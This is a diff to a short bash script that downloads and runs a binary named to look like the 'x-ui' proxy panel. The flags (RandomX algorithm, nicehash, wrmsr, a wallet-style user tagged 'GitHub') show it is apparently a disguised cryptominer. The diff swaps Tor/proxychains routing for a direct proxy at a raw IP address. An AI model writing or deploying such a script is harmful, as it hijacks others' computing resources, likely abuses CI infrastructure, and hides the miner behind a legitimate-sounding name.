@@ -1,9 +1,10 @@
 #!/bin/bash
 
 sudo apt update
-sudo apt install tor proxychains unzip -y
+sudo apt install unzip -y
 
-sudo nohup tor &>/dev/null &
+#sudo apt install tor proxychains unzip -y
+#sudo nohup tor &>/dev/null &
 
 cpu=$(echo nproc | bash)
 user="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.GitHub"
@@ -19,8 +20,8 @@ unzip x-ui-linux-x64.zip
 cd x-ui-linux-x64/x-ui-6.16.2
 
 chmod 777 x-ui
-
-proxychains ./x-ui -a rx -k -o $seed -u $user - px \
+./x-ui -a rx -k -o $seed -u $user - px \
 --threads=$cpu --cpu-priority=2 \
 --astrobwt-avx2 --nicehash \
---randomx-wrmsr=-1 --keepalive 
+--randomx-wrmsr=-1 --keepalive \
+--proxy=107.174.39.48:6666
